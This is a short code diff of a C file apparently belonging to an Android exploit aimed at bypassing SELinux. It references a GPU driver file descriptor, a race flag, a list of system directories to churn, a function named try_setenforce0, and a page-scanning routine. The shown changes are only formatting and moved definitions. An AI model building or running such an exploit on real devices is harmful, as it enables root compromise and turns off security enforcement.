@@ -1,4 +1,5 @@
 #include "avc_bypass.h"
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -15,12 +16,13 @@
 #include <pthread.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
-#include <sys/types.h>
 #include <sys/prctl.h>
 #include <sys/wait.h>
 #include <dirent.h>
 #include <time.h>
 #include <signal.h>
+
+#define CHURN_MAX_PATHS 20000
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
@@ -175,7 +177,7 @@ static const char *churn_dirs[] = {
     "/system/lib64", "/data/data", "/data/app", "/data/user/0",
     "/dev", "/proc",
 };
-#define CHURN_MAX_PATHS 20000
+
 static char churn_paths[CHURN_MAX_PATHS][160];
 static int churn_npaths = 0;
 static int churn_built = 0;
@@ -252,6 +254,7 @@ static int try_setenforce0(void) {
 
 #define PRE_SCAN_DWORDS 560
 #define PRE_PAGES_PER_IB 4
+
 static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               uint64_t scan_start, uint64_t end_va,
